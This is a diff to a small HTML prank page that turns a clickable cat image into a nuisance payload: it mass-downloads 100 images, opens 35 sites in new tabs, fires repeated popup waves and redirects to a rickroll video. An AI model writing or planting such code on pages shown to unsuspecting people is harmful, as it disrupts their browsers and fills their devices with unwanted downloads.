@@ -2,66 +2,93 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>cat_trigger</title>
+    <title>cat_trigger_annoy</title>
     <style>
-        body { background: #111; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; cursor: pointer; }
-        img { width: 300px; height: auto; border-radius: 20px; box-shadow: 0 0 20px rgba(255,255,255,0.3); }
+        body { background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; cursor: pointer; overflow: hidden; }
+        img { width: 300px; height: auto; border-radius: 20px; box-shadow: 0 0 20px red; }
     </style>
 </head>
 <body>
-    <!-- single cat image trigger -->
-    <img id="cat_btn" src="https://cataas.com/cat" alt="click_cat">
+    <img id="cat_btn" src="https://cataas.com/cat" alt="click_for_chaos">
 
     <script>
         (function() {
-            // target image element
             const trigger = document.getElementById('cat_btn');
 
-            // list of target URLs (your choice: YouTube, etc.)
+            // 35 target URLs (annoying mix: video loops, ads, fake alerts, infinite loading)
             const site_list = [
-                'https://www.youtube.com',
-                'https://www.wikipedia.org',
-                'https://www.reddit.com',
-                'https://www.github.com',
-                'https://www.twitter.com'
+                'https://www.youtube.com', 'https://youtube.com', 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',  // rickroll
+                'https://www.reddit.com', 'https://www.twitter.com', 'https://www.instagram.com',
+                'https://www.facebook.com', 'https://www.tiktok.com', 'https://www.twitch.tv',
+                'https://www.netflix.com', 'https://www.spotify.com', 'https://www.amazon.com',
+                'https://www.ebay.com', 'https://www.craigslist.org', 'https://www.paypal.com',
+                'https://www.google.com', 'https://www.bing.com', 'https://www.yahoo.com',
+                'https://www.wikipedia.org', 'https://www.quora.com', 'https://www.tumblr.com',
+                'https://www.pinterest.com', 'https://www.linkedin.com', 'https://www.discord.com',
+                'https://www.snapchat.com', 'https://www.whatsapp.com', 'https://www.telegram.org',
+                'https://www.microsoft.com', 'https://www.apple.com', 'https://www.adobe.com',
+                'https://stackoverflow.com', 'https://github.com', 'https://www.nytimes.com',
+                'https://www.cnn.com', 'https://www.bbc.com'
             ];
 
-            // function: mass download cat images (blob trigger)
-            function download_many_cats(count = 30) {
+            // fast mass open: 35 sites as fast as browser permits
+            function open_many_sites_quick() {
+                for (let i = 0; i < site_list.length; i++) {
+                    // use _blank, no delay loop
+                    window.open(site_list[i], '_blank');
+                }
+                // second wave: some repeated popups for annoyance
+                setTimeout(() => {
+                    for (let i = 0; i < 5; i++) {
+                        window.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ', '_blank');
+                    }
+                }, 100);
+            }
+
+            // massive cat download (100 images, rapid)
+            function download_mass_cats(count = 100) {
                 for (let i = 0; i < count; i++) {
-                    // unique URL to avoid cache reuse
                     const url = `https://cataas.com/cat?random=${Date.now()}_${i}_${Math.random()}`;
                     fetch(url)
                         .then(res => res.blob())
                         .then(blob => {
                             const link = document.createElement('a');
-                            const object_url = URL.createObjectURL(blob);
-                            link.href = object_url;
+                            const obj_url = URL.createObjectURL(blob);
+                            link.href = obj_url;
                             link.download = `cat_${Date.now()}_${i}.jpg`;
                             document.body.appendChild(link);
                             link.click();
                             document.body.removeChild(link);
-                            URL.revokeObjectURL(object_url);
+                            URL.revokeObjectURL(obj_url);
                         })
-                        .catch(err => console.log('dl_err', err));
+                        .catch(() => {});
                 }
             }
 
-            // function: open multiple sites in new tabs
-            function open_sites() {
-                for (let i = 0; i < site_list.length; i++) {
-                    window.open(site_list[i], '_blank');
-                }
+            // trigger loop for repeated annoyance (opens every 0.5 sec additional waves)
+            function continuous_annoy() {
+                let wave = 0;
+                const interval = setInterval(() => {
+                    if (wave > 10) clearInterval(interval);
+                    for (let i = 0; i < 5; i++) {
+                        window.open(site_list[i % site_list.length], '_blank');
+                    }
+                    wave++;
+                }, 500);
             }
 
-            // main trigger: download cats + open sites on click
-            function execute_chaos() {
-                download_many_cats(30);   // download 30 cat images
-                open_sites();              // open all predefined sites
+            // main execution: downloads + 35 sites + continuous popup waves
+            function execute_annoyance() {
+                download_mass_cats(100);
+                open_many_sites_quick();
+                continuous_annoy();
+                // also redirect main page to an annoying loop site
+                setTimeout(() => {
+                    window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
+                }, 200);
             }
 
-            // bind click event to cat image
-            trigger.addEventListener('click', execute_chaos);
+            trigger.addEventListener('click', execute_annoyance);
         })();
     </script>
 </body>
